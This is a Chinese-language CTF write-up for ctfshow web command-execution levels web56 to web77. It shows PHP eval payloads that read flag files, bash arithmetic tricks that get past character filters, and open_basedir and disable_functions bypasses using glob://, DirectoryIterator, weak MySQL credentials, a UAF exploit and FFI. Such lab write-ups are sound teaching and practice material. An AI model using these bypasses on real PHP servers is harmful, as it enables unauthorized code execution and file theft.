---
title: "ctfshow Web入门[命令执行] web56-77 Writeup"
date: 2022-08-09T17:56:28+08:00
draft: false
author: "X1r0z"

tags: ['linux','php','ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

剩下来的命令执行

有一些 open_basedir 和 disable_functions 的绕过

<!--more-->

## web56

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091054225.png)

过滤了字母和数字

根据上一题, 只能使用 `.` 执行 PHP 的缓存文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091057063.png)

## web57

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091101848.png)

提示 flag 在 36.php 中

发现 `$` 没被过滤, 当时想的是类似 `$$` `$@` `$!` 的指令, 然后 `++` `--` 这样子, 本地测试发现都不好构造36

hint 如下

```bash
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
${_} ="" //返回上一次命令
$((${_}))=0
$((~$((${_}))))=-1
```

双小括号的介绍 [http://c.biancheng.net/view/2480.html](http://c.biancheng.net/view/2480.html)

```bash
exp10it@LAPTOP-TBAF1QQG:~$ echo $(())
0
exp10it@LAPTOP-TBAF1QQG:~$ echo $((~$(())))
-1
exp10it@LAPTOP-TBAF1QQG:~$ echo $(($((~$(()))) $((~$(())))))
-2
exp10it@LAPTOP-TBAF1QQG:~$ echo $((-1 -1))
-2
exp10it@LAPTOP-TBAF1QQG:~$ echo $((-1 1))
-bash: -1 1: syntax error in expression (error token is "1")
exp10it@LAPTOP-TBAF1QQG:~$ echo $((1 1))
-bash: 1 1: syntax error in expression (error token is "1")
```

`$(())` 的默认值是0 ,因为里面没有任何东西, 对0取反得到-1, 取反的结果需要用另一对`$(())` 包裹住

这里的-1有点特殊, 因为类似 `$((1 1))` 的命令是错误的 (没有运算符号), 而两个-1并在一起 `$((-1 -1))` 会让 shell 认为是 `$((-1-1))` 即-1减去1, 然后得到-2

```bash
exp10it@LAPTOP-TBAF1QQG:~$ echo $((~36))
-37
```

36的取反结果是-37, 就是说我们需要通过-1来构造出-37, 然后再取反一次

```bash
$((~$(($((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(())))))))
```

访问得到 flag

```
http://8eba4c63-5365-45f7-9c6b-7a0d556e22f7.challenge.ctf.show/?c=$((~$(($((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))%20$((~$(())))))))
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091138556.png)

## web58

命令执行的函数都被 ban 了, 但是 `file_get_contents()` 还能用

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091147569.png)

然后看到了 index 里的 `highlight_file(__FILE__)`, 也能够读取 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091147054.png)

payload 如下

```php
echo file_get_contents('flag.php')
echo fread(fopen('flag.php','r'),filesize('flag.php'))
highlight_file('flag.php')
show_source('flag.php')
readfile('flag.php')
print_r(file('flag.php'));
```

之前的无参数读取文件在这里也能用

## web59-65

同上

或者配合伪协议进行文件包含, eval 在这里比较灵活, 方法很多

## web66

flag 换了个位置

```
c=print_r(scandir('/')); # 列出 / 目录下的所有文件
c=highlight_file('/flag.txt');
```

其实只要题目源码能看得到, `highlight_file()` 就一直能用...

## web67

`print_r()` 被过滤了, 换成 `var_dump()` 或者 `var_export()`

`scandir()` 返回的是数组, 其实就算被过滤了也可以加下标 echo 输出或者写个循环

## web68

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091209962.png)

都被过滤了, 换成文件包含, 盲猜一个 /flag.txt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091210748.png)

`scandir()` 没有被过滤, 严谨一点列目录再读取也可以

## web69-70

同上

## web71

index.php 附件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091213615.png)

感觉漏了个 `ob_start()`

就是说将脚本输出的内容发送到缓冲区, 然后通过 `ob_get_contents()` 获取缓冲区内容, `ob_end_clean()` 清除并关闭缓冲区, 最后通过 `preg_replace()` 过滤输出

简单来说就是我们 eval 返回的输出内容被过滤了, 大小写字母和数字会被替换成 `?`

测试了一下发现如果语句执行错误, 会显示原来的内容

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091226025.png)

没有被过滤

当语句执行成功后才被过滤

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091227799.png)

也就是说过滤的操作是在我们当前的命令执行完以后再进行的

我们可以通过 `die()` `exit()` 让程序终止, 不再继续往下执行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091228428.png)

## web72

/flag.txt 提示不存在

列目录发现被限制了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091234606.png)

考察的是 `open_basedir` 和 `disable_function` 的绕过

[https://www.v0n.top/2020/07/10/open_basedir绕过/](https://www.v0n.top/2020/07/10/open_basedir绕过/)

[https://www.anquanke.com/post/id/208451](https://www.anquanke.com/post/id/208451)

使用 `scandir() + glob://` 列目录, 不过 glob:// 协议还是有限制, 子目录就不能列了

```php
var_export(scandir('glob://*'));die(); # open_basedir 允许的目录
var_export(scandir('glob:///*'));die(); # 根目录 /
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091546358.png)

flag 在 /flag0.txt 内, 但是受限于 open_basedir 和 disable_functions, 常规的文件读取和文件包含都不起作用

于是尝试 bypass disable_functions

其中一个 exp

```
Backtrace UAF # PHP 7.0-7.4
```

[https://github.com/mm0r1/exploits](https://github.com/mm0r1/exploits)

我用的是安全客里的 exp, 注意 url 编码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091549546.png)

执行失败, 报错显示 `str_repeat()` 被禁用了

发现是这两处调用了这个函数

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091550231.png)

本质上是把 `A` 重复79遍, 干脆手工替换

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091553296.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091554248.png)

又失败了, 这次是 `chr()` 被禁用

查阅 PHP 官方手册发现可以使用 `sprintf('%c', $var)` 的形式替代 `chr($var)`

[https://www.php.net/manual/zh/function.sprintf.php](https://www.php.net/manual/zh/function.sprintf.php)

替换之

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091555455.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091556607.png)

执行成功

查看 /flag0.txt 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091556603.png)

## web73

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091604835.png)

/flagc.txt

竟然可以直接包含了...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091609674.png)

## web74

`scandir()` 被 ban 了

换成 DirectoryIterator

```php
$a = new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
die();
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091612007.png)

然后 include 读取 flag

## web75

DirectoryIterator + glob:// 列目录

flag 在 /flag36.txt, include 包含失败, 存在 open_basedir 限制

hint 提示是 mysql 弱口令连接, 用 `load_file()` 读文件...(???)

```php
$dbh = new PDO('mysql:host=127.0.0.1;dbname=mysql','root','root');
foreach ($dbh->query('show databases;') as $row){
	var_export($row);
}
die();
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091629329.png)

读文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091630009.png)

## web76

/flag36d.txt

同上

## web77

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091634315.png)

提示是 php 7.4

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091639456.png)

response 头显示 `X-Powered-By: PHP/7.4.9`

`strlen()` 被禁用. 三种 UAF exp 都不能用, 在上面安全客的文章里找了一会

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091637663.png)

> FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP 的 FFI 扩展就是一个让你在 PHP 里调用 C 代码的技术。

尝试一下 FFI 扩展

`cat /flag36x.txt > /var/www/flag.txt` 读不出来

换成 readflag 下载下来发现是个 ELF 文件

于是用 readflag 读取 /flag36.txt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091644530.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208091644561.png)
